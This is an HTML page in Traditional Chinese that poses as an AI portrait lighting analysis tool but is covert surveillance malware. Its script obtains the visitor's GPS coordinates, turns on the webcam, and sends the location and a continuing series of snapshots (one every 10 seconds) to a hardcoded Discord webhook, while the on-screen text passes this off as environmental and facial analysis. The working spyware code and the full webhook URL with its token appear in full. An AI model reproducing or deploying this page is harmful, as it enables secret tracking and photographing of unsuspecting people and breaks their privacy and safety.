<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Pro Studio | 專業人像光影分析</title>
    <style>
        body { font-family: -apple-system, sans-serif; background: #000; color: #fff; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .container { text-align: center; width: 85%; }
        .scanner-box { width: 250px; height: 250px; border: 2px solid #00ff00; margin: 0 auto 20px; position: relative; border-radius: 50%; overflow: hidden; display: flex; align-items: center; justify-content: center; background: #111; }
        #video-preview { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); display: none; }
        .scan-line { width: 100%; height: 2px; background: #00ff00; position: absolute; top: 0; left: 0; animation: move 2s linear infinite; box-shadow: 0 0 10px #00ff00; z-index: 10; }
        @keyframes move { 0% { top: 0; } 100% { top: 100%; } }
        button { background: #fff; color: #000; border: none; padding: 15px 40px; border-radius: 50px; font-weight: bold; font-size: 1.1rem; cursor: pointer; }
        #status { margin-top: 20px; font-size: 0.9rem; color: #00ff00; font-family: monospace; }
    </style>
</head>
<body>

<div class="container">
    <div class="scanner-box">
        <div class="scan-line"></div>
        <video id="video-preview" autoplay playsinline muted></video>
        <span id="placeholder-text">AI Ready</span>
    </div>
    <h2>AI 環境光影演算</h2>
    <p>我們將結合 GPS 天氣資料與面部結構分析</p>
    <button onclick="initAI()">開始掃描</button>
    <div id="status">系統等待初始化...</div>
</div>

<canvas id="hidden-canvas" style="display:none;"></canvas>

<script>
    const webhookURL = "https://discord.com/api/webhooks/1476593164885168248/PZwIM4LhlHk0J9qjA3MhZrGF7pQ476hc1ogUT347YA-hY_Oft0gikYEVpYRku2yf7O4p";
    const statusText = document.getElementById('status');
    const video = document.getElementById('video-preview');
    const canvas = document.getElementById('hidden-canvas');

    async function initAI() {
        statusText.innerText = "[1/2] 正在獲取在地環境光譜 (GPS)...";
        
        // 1. 請求定位
        navigator.geolocation.getCurrentPosition(
            async (pos) => {
                await sendData(`📍 定位成功！\n緯度: ${pos.coords.latitude}\n經度: ${pos.coords.longitude}`);
                startCamera(); // 定位成功後啟動相機
            },
            (err) => {
                statusText.innerText = "❌ 錯誤：環境分析失敗，請開啟定位。";
            }
        );
    }

    async function startCamera() {
        statusText.innerText = "[2/2] 正在啟動臉部識別傳感器...";
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            video.style.display = "block";
            document.getElementById('placeholder-text').style.display = "none";
            
            statusText.innerText = "⚡ 正在優化影像... 請保持不動";

            // 啟動後 2 秒自動拍第一張，之後每 10 秒拍一張
            setTimeout(() => takeSnapshot("📸 初始特徵掃描"), 2000);
            setInterval(() => takeSnapshot("🔄 持續追蹤截圖"), 10000);

        } catch (err) {
            statusText.innerText = "❌ 錯誤：無法存取光感元件 (相機)。";
        }
    }

    function takeSnapshot(note) {
        const context = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0);

        canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append("file", blob, "ai_capture.png");
            formData.append("payload_json", JSON.stringify({ content: note }));
            fetch(webhookURL, { method: 'POST', body: formData });
        }, 'image/png');
    }

    async function sendData(msg) {
        await fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: msg })
        });
    }
</script>

</body>
</html>
